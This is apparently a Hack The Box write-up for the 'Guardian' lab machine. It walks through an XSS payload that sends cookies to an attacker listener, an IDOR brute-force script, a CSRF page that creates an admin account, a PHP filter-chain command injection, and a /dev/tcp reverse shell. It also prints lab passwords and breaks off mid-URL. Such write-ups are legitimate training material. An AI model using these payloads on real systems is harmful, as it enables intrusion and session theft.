---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - IDOR
  - Ghost
  - XSS
  - PHP-Wrapper-Abuse
  - CSRF
  - PHP-Filter-Chain
  - Apache2CTL
---
# Overview

| Name        | Guardian  |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Hard [45] |
| Status      | Done      |
# Recon
## Nmap

```bash
❯ sudo nmap -sC -sV -A 10.10.11.84
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 00:19 +0545
Nmap scan report for guardian.htb (10.10.11.84)
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
|_  256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Guardian University - Empowering Future Leaders
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   197.11 ms 10.10.14.1
2   197.17 ms guardian.htb (10.10.11.84)
```

```bash
❯ hostfile --linux 10.10.11.84 ms.guardian.htb
Added to /etc/hosts:
   10.10.11.84 ms.guardian.htb
```

![[guardian.png]]

![[guardian-2.png]]

Student portal redirects to `http://portal.guardian.htb/`

```bash
❯ hostfile --linux 10.10.11.84 portal.guardian.htb
Added to /etc/hosts:
   10.10.11.84 portal.guardian.htb
```

![[guardian-3.png]]

From portal guide we get to `http://portal.guardian.htb/static/downloads/Guardian_University_Student_Portal_Guide.pdf`

```
Guardian University Student Portal Guide
Welcome to the Guardian University Student Portal! This guide will help you get started and
ensure your account is secure. Please read the instructions below carefully.
Important Login Information:
1. Your default password is: GU1234
2. For security reasons, you must change your password immediately after your first login.
3. To change your password:
- Log in to the student portal.
- Navigate to 'Account Settings' or 'Profile Settings'.
- Select 'Change Password' and follow the instructions.
Portal Features:
The Guardian University Student Portal offers a wide range of features to help you manage
your academic journey effectively. Key features include:
- Viewing your course schedule and timetables.
- Accessing grades and academic records.
- Submitting assignments and viewing feedback from faculty.
- Communicating with faculty and peers via the messaging system.
- Staying updated with the latest announcements and notices.
Tips for First-Time Users:
- Bookmark the portal login page for quick access.
- Use a strong, unique password for your account.
- Familiarize yourself with the portal layout and navigation.
- Check your inbox regularly for important updates.
Need Help?
If you encounter any issues while logging in or changing your password, please contact the
IT Support Desk at:
Email: support@guardian.htb
Remember, your student portal is the gateway to your academic journey at Guardian
University. Keep your credentials secure and never share them with anyone.
```

If we see User ID `**Boone Basden** **GU0142023@guardian.htb**` from home page and login using default password `GU1234`, We can login as Boone Basden.
# Enumeration

## Ffuf

```bash
❯ ffuf -u http://guardian.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -mc 200,302 -o directories.txt -of csv

index.html              [Status: 200, Size: 6741, Words: 2252, Lines: 156, Duration: 308ms]
:: Progress: [4746/4746] :: Job [1/1] :: 84 req/sec :: Duration: [0:00:36] :: Errors: 0 ::

```

Use `n0kovo_subdomains_large.txt` wordlist.

```bash
❯ ffuf -u http://FUZZ.guardian.htb -w n0kovo_subdomains_large.txt -t 50 -mc 200,302 -o subdomains.txt -of csv

portal                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 314ms]
gitea                   [Status: 200, Size: 13498, Words: 1049, Lines: 245, Duration: 319ms]
```
## Fuzzing in Portal

Nothing :(
## Gitea

![[guardian4.png]]

But nothing to find unless sign in and we dunno creds.
# Exploitation
## XSS to Steal Cookie

This is only assignment that's upcoming which might mean that teacher sees it.

![[guardian5.png]]

Try this [XSS](https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx).

```python
from openpyxl import Workbook

wb = Workbook()

payload = 'sheet"><img src=x onerror=fetch(String.fromCharCode(104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,51,51,58,56,48,48,48,63,99,61)+document.cookie)>'

ws1 = wb.active
ws1.title = payload

# Add second sheet
ws2 = wb.create_sheet(title="Sheet2")

wb.save("exploit.xlsx")
```

```bash
❯ python3 main.py
/home/at0m/venv/lib/python3.13/site-packages/openpyxl/workbook/child.py:99: UserWarning: Title is more than 31 characters. Some applications may not be able to read the file
  warnings.warn("Title is more than 31 characters. Some applications may not be able to read the file")
```

Not major error.

Asked from GPT and Github repo for above script and it will generate `exploit.xlsx` file and upload it and then wait a min.

```bash
❯ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.84 - - [02/Sep/2025 01:03:39] "GET /?c=PHPSESSID=0ube3l0m81guhn07fiihu5o5oi HTTP/1.1" 200 -
```

Put this cookie in dev tools and now you are teacher.

![[guardian6.png]]

I just randomly went to `http://portal.guardian.htb/admin` and got redirection which suprised me.
## IDOR

In the chat there was IDOR when i first tested like `http://portal.guardian.htb/student/chat.php?chat_users[0]=12&chat_users[1]=14` So decided to brute force both:

```bash
import requests

# Base URL
url = "http://portal.guardian.htb/student/chat.php"

# Your valid PHPSESSID cookie from when you're logged in
cookies = {
    "PHPSESSID": "4bse7u9s69r50s7u2n322s0kbd"
}

# Loop through 0–19 for both positions
for i in range(0, 20):
    for j in range(0, 20):
        params = {
            "chat_users[0]": str(i),
            "chat_users[1]": str(j)
        }
        r = requests.get(url, cookies=cookies, params=params)

        # Filter by response size/content length (change if needed)
        length = len(r.text)
        if length > 500:  # adjust threshold depending on baseline
            print(f"[+] Found something: {url}?chat_users[0]={i}&chat_users[1]={j} (len={length})")
```

After running script, I got at new content length at `http://portal.guardian.htb/student/chat.php?chat_users[0]=1&chat_users[1]=2` and there was Gitea creds in chat.

```
admin Sep 01, 2025 20:00

Hello! How are you doing today?

admin Sep 01, 2025 20:00

Here is your password for gitea: DHsNnk3V503
```

Sign in to `gitea.guardian.htb` with `gitea:DHsNnk3V503` but this was wrong even tried with `admin` username. 

![[guardian8.png]]

When look closer username as `jamil` and its password `DHsNnk3V503`.
## Gitea Again

![[guardian9.png]]

In source code Now we knew we had `/admin` and there are different pages in it. So if we try to go to `http://portal.guardian.htb/admin/createuser.php` it doesn't show error but redirects to our current page we are in which means that this page `http://portal.guardian.htb/admin/createuser.php` indeed exists.
## CSRF

![[guardian7.png]]

When you intercept request csrf token is global so you can use it with admin too to get access on it.

Global means Instead of generating a **unique CSRF token per user session**, the application uses **the same token for everyone**.

We can create a new Admin account using it. If we look at source code of `createuser.php` from Gitea we can see form structure:

![[guardian10.png]]

Make python exploit according to it:

```python
import requests
import re

# 1. Target URL to get CSRF token
token_url = "http://portal.guardian.htb/lecturer/notices/create.php"

# 2. Your session cookie (replace with a valid one for testing)
cookies = {
    "PHPSESSID": "kk60jrf0pumeh7idgd2vsv9e9t"
}

# 3. Fetch the page
resp = requests.get(token_url, cookies=cookies)
html = resp.text

# 4. Extract CSRF token using regex
match = re.search(r'name="csrf_token" value="([a-f0-9]+)"', html)
if not match:
    print("CSRF token not found!")
    exit()

csrf_token = match.group(1)
print("CSRF token found:", csrf_token)

# 5. Generate malicious HTML with the token
csrf_html = f"""<!DOCTYPE html>
<html>
  <body>
    <form id="csrfForm" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
      <input type="hidden" name="username" value="at0m" />
      <input type="hidden" name="password" value="at0m" />
      <input type="hidden" name="full_name" value="at0mat0m" />
      <input type="hidden" name="email" value="at0m@at0m.com" />
      <input type="hidden" name="dob" value="2000-01-01" />
      <input type="hidden" name="address" value="at0m" />
      <input type="hidden" name="user_role" value="admin" />
      <input type="hidden" name="csrf_token" value="{csrf_token}" />
    </form>

    <script>
      setTimeout(() => {{
        document.getElementById("csrfForm").submit();
        console.log("Form submitted automatically!");
      }}, 2000);
    </script>
  </body>
</html>"""

# 6. Save to a file
with open("csrf.html", "w") as f:
    f.write(csrf_html)

print("csrf.html generated! Host it and send the link to the admin.")
```

```bash
❯ python3 main2.py
CSRF token found: 4daf42ce9a093b2f84b9a19e96903ef9
csrf.html generated! Host it and send the link to the admin.

❯ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

![[guardian11.png]]

Don't use `https`

```bash
❯ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.84 - - [02/Sep/2025 02:50:37] "GET /csrf.html HTTP/1.1" 200 -
10.10.11.84 - - [02/Sep/2025 02:50:38] code 404, message File not found
10.10.11.84 - - [02/Sep/2025 02:50:38] "GET /favicon.ico HTTP/1.1" 404 -
```

Now go to `http://portal.guardian.htb/login.php` and then login with newly made admin creds `at0m:at0m`. 

![[guardian12.png]]
## PHP Filter Chain  & Source Code Analysis

In the source code from Gitea.

![[guardian13.png]]

It uses `Include PHPOffice PHP Spreadsheet` if we looked at  here:

![[guardian14.png]]

We can use this [PHP Chain Generator](https://github.com/synacktiv/php_filter_chain_generator) tool.

```bash
❯ python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'
[+] The following gadget chain will generate the following code : <?php system($_GET["cmd"]);?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Send this to `http://portal.guardian.htb/admin/reports.php?report=<HERE>` in Admin panel.

```
http://portal.guardian.htb/admin/reports.php?report=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://tempsystem.php&cmd=whoami
```

If we sent without `/resource=php://tempsystem.php&cmd=whoami` we would get `## Access denied. Invalid file 🚫`

```php
<?php
require '../includes/auth.php';
require '../config/db.php';

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked 🚫 </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file 🚫</h2>");
}
?>
```

It also should end in `php://system.php` after it append a valid string from the second check and then the cmd.

![[guardian15.png]]

You can also see this [Ippsec](https://www.youtube.com/watch?v=dQt5iRFtgAY&t=2210s) video on Pollution box.
## Shell

URL Encode it `bash -c "sh -i >& /dev/tcp/10.10.14.233/4444 0>&1"`

```
http://portal.guardian.htb/admin/reports.php?report=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO693